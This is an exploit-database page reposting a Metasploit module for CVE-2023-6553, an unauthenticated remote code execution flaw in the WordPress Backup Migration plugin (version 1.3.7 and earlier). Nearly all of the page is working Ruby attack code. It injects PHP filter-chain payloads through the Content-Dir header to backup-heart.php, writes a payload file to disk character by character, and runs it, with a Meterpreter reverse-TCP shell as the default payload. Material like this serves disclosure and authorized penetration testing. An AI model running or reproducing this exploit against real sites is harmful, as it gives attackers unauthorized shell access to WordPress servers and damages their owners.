---
title: WordPress Backup Migration 1.3.7: Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2025100014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-10-27
fetch_date: 2025-10-28T02:58:26.781480
---

# WordPress Backup Migration 1.3.7: Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Backup Migration 1.3.7: Remote Command Execution** **2025.10.27**  Credit:  **[DANG](https://cxsecurity.com/author/DANG/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-6553](https://cxsecurity.com/cveshow/CVE-2023-6553/ "Click to see CVE-2023-6553")**  CWE: **N/A** | |

# Exploit Title: WordPress Backup Migration 1.3.7: Remote Command Execution
# Date: 2025-10-26
# Exploit Author: DANG
# Vendor Homepage: https://backupbliss.com/
# Software Link: https://wordpress.org/plugins/backup-backup/
# Version: Backup Migration ≤1.3.7
# Tested on: LINUX
# CVE : CVE-2023-6553
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HTTP::Wordpress
include Msf::Exploit::Remote::HTTP::PhpFilterChain
include Msf::Exploit::FileDropper
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'WordPress Backup Migration Plugin PHP Filter Chain RCE',
'Description' => %q{
This module exploits an unauth RCE in the WordPress plugin: Backup Migration (<= 1.3.7). The vulnerability is
exploitable through the Content-Dir header which is sent to the /wp-content/plugins/backup-backup/includes/backup-heart.php endpoint.
The exploit makes use of a neat technique called PHP Filter Chaining which allows an attacker to prepend
bytes to a string by continuously chaining character encoding conversions. This allows an attacker to prepend
a PHP payload to a string which gets evaluated by a require statement, which results in command execution.
},
'Author' => [
'Nex Team', # Vulnerability discovery
'Valentin Lobstein', # PoC
'jheysel-r7' # msfmodule
],
'License' => MSF\_LICENSE,
'References' => [
['CVE', '2023-6553'],
['URL', 'https://github.com/Chocapikk/CVE-2023-6553/blob/main/exploit.py'],
['URL', 'https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it'],
['WPVDB', '6a4d0af9-e1cd-4a69-a56c-3c009e207eca']
],
'DefaultOptions' => {
'PAYLOAD' => 'php/meterpreter/reverse\_tcp'
},
'Platform' => ['unix', 'linux', 'win', 'php'],
'Arch' => [ARCH\_PHP],
'Targets' => [['Automatic', {}]],
'DisclosureDate' => '2023-12-11',
'DefaultTarget' => 0,
'Privileged' => false,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options(
[
OptString.new('PAYLOAD\_FILENAME', [ true, 'The filename for the payload to be used on the target host (%RAND%.php by default)', Rex::Text.rand\_text\_alpha(4) + '.php']),
]
)
end
def check
return CheckCode::Unknown unless wordpress\_and\_online?
wp\_version = wordpress\_version
print\_status("WordPress Version: #{wp\_version}") if wp\_version
# The plugin's official name seems to be Backup Migration however the package filename is "backup-backup"
check\_code = check\_plugin\_version\_from\_readme('backup-backup', '1.3.8')
if check\_code.code != 'appears'
return CheckCode::Safe
end
plugin\_version = check\_code.details[:version]
print\_good("Detected Backup Migration Plugin version: #{plugin\_version}")
CheckCode::Appears
end
def send\_payload(payload)
php\_filter\_chain\_payload = generate\_php\_filter\_payload(payload)
res = send\_request\_cgi(
'uri' => normalize\_uri(target\_uri.path, 'wp-content', 'plugins', 'backup-backup', 'includes', 'backup-heart.php'),
'method' => 'POST',
'headers' => {
'Content-Dir' => php\_filter\_chain\_payload
}
)
fail\_with(Failure::Unreachable, 'Connection failed') if res.nil?
fail\_with(Failure::UnexpectedReply, 'The server did not respond with the expected 200 response code') unless res.code == 200
end
def write\_to\_payload\_file(string\_to\_write)
# Because the payload is base64 encoded and then each character is translated into it's corresponding php filter chain,
# the payload becomes quite large and we start to hit limitations due to the HTTP header size.
# For example this payload: "<?php fwrite(fopen("G", "a"),"\x73");?>", ends up being 7721 characters long.
# The payload size limit on the target I was testing seemed to be around 8000 characters.
# Using the following: <?php file\_put\_contents("file.php","char",FILE\_APPEND);?> (more elegant solution) exceeds the
# size limit which is why I ended up using <?php fwrite(fopen("<single\_char\_filename>", "char" ?> and then after
# copying the single\_char\_filename to a filename with a .php extension to be executed.
single\_char\_filename = Rex::Text.rand\_text\_alpha(1)
string\_to\_write.each\_char do |char|
send\_payload("<?php fwrite(fopen(\"#{single\_char\_filename}\",\"a\"),\"#{'\\x' + char.unpack('H2')[0]}\");?>")
end
register\_file\_for\_cleanup(single\_char\_filename)
send\_payload("<?php copy(\"#{single\_char\_filename}\",\"#{datastore['PAYLOAD\_FILENAME']}\");?>")
register\_file\_for\_cleanup(datastore['PAYLOAD\_FILENAME'])
end
def trigger\_payload\_file
res = send\_request\_cgi(
'uri' => normalize\_uri(target\_uri.path, 'wp-content', 'plugins', 'backup-backup', 'includes', datastore['PAYLOAD\_FILENAME']),
'method' => 'GET'
)
print\_warning('The application responded to the request to trigger the payload, this is unexpected. Something may have gone wrong.') if res
end
def exploit
print\_status('Writing the payload to disk, character by character, please wait...')
# Use double quotes in the payload, not single.
write\_to\_payload\_file("<?php #{payload.encoded}")
trigger\_payload\_file
end
end

**##### References:**

https://nvd.nist.gov/vuln/detail/CVE-2023-6553

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025100014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {...